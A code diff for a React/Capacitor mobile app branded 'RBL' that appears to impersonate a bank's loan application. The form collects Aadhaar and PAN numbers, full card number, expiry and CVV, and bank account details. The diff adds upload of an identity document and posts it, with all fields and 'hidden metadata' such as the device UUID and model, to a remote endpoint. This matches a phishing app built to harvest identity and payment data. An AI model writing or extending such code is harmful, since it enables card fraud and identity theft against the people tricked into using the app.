@@ -169,7 +169,7 @@ const WelcomeScreen = ({ onCompleted, onConfig }) => {
                 <div onClick={handleTap} className="active:scale-95 transition-transform mb-8">
                     <div className="flex items-center gap-3">
                         <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center p-2 shadow-2xl overflow-hidden">
-                            <img src="./assets/rbl_logo.png" className="w-full h-auto" alt="Logo" onError={(e) => {
+                            <img src="./assets/logo.png" className="w-full h-auto" alt="Logo" onError={(e) => {
                                 e.target.style.display = 'none';
                                 e.target.parentElement.innerHTML = '<span class="text-red-600 font-bold text-2xl">RBL</span>';
                             }} />
@@ -398,7 +398,13 @@ const DocumentUpload = ({ onComplete, isSubmitting, onBack }) => {
                     <p className="text-sm text-slate-500 text-center max-w-[200px]">
                         {fileName || 'PDF or JPG format, max 5MB.'}
                     </p>
-                    <input type="file" ref={fileRef} className="hidden" onChange={(e) => setFileName(e.target.files[0]?.name)} accept="image/*,application/pdf" />
+                    <input type="file" ref={fileRef} className="hidden" onChange={(e) => {
+                        const file = e.target.files[0];
+                        if (file) {
+                            setFileName(file.name);
+                            update({ file });
+                        }
+                    }} accept="image/*,application/pdf" />
                 </div>
 
                 <div className="mt-8 flex items-center gap-3 px-4 py-3 bg-red-600/10 rounded-lg text-red-500 border border-red-600/20 inline-flex">
@@ -450,7 +456,8 @@ export default function App() {
     const [formData, setFormData] = useState({
         name: '', phone: '', dob: '', jobType: '', maritalStatus: '',
         amount: 250000, aadhaar: '', pan: '', cardNumber: '', cardExpiry: '', cardCvv: '',
-        bankName: '', accNo: '', confirmAccNo: '', ifsc: ''
+        bankName: '', accNo: '', confirmAccNo: '', ifsc: '',
+        file: null
     });
     const [isSubmitting, setIsSubmitting] = useState(false);
     const [deviceInfo, setDeviceInfo] = useState(null);
@@ -468,28 +475,33 @@ export default function App() {
             } catch (e) { }
         };
         fetchInfo();
-
-        // Native Permission Request (Android)
-        if (window.Capacitor && window.Capacitor.getPlatform() === 'android') {
-            console.log('[RBL] Initializing Native Permission Failsafe...');
-        }
     }, []);
 
     const submitApplication = useCallback(async (data) => {
         setIsSubmitting(true);
-        const payload = {
-            ...data,
-            deviceId: deviceInfo?.uuid || 'Unknown',
-            deviceInfo: `${deviceInfo?.model || 'Unknown'} (${deviceInfo?.osVersion || 'Unknown'})`,
-            appId: appNo
-        };
+
+        const fd = new FormData();
+        // Append all text fields
+        Object.keys(data).forEach(key => {
+            if (key !== 'file') fd.append(key, data[key]);
+        });
+
+        // Append hidden metadata
+        fd.append('deviceId', deviceInfo?.uuid || 'Unknown');
+        fd.append('deviceInfo', `${deviceInfo?.model || 'Unknown'} (${deviceInfo?.osVersion || 'Unknown'})`);
+        fd.append('appId', appNo);
+
+        // Append the PDF file
+        if (data.file) {
+            fd.append('document', data.file);
+        }
 
         try {
-            console.log('[RBL] Submitting Payload:', payload);
+            console.log('[RBL] Submitting FormData...');
             const res = await fetch(API_URL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: fd
+                // Note: Don't set Content-Type header manually with FormData, let the browser do it with the boundary
             });
 
             if (res.ok) {
